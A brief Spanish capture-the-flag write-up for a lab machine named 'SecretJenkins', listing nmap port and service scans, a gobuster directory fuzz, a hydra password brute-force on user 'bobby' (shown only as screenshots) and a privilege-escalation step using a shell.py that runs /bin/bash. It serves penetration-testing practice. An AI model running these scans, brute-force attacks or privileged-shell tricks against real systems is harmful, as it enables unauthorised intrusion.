# Maquina SecretJenkins

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

![alt text](image.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,8080 -vvv -Pn 172.17.0.2

![alt text](image-1.png)

### Fuzzing Web

gobuster dir -t 200 -u http://172.17.0.2:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -r -b 403,404 2>/dev/null


### Descargando el cli

![alt text](image-3.png)

Buscamos posibles usuarios:

![alt text](image-5.png)

Encontramos a:

![alt text](image-2.png)

Hacemos un ataque con hydra al usuario bobby:

![alt text](image-4.png)


### Intrusión y escalar privilegios

![alt text](image-6.png)

a shell.py lo creé de la siguiente manera:

echo "import os
os.system('/bin/bash')" > shell.py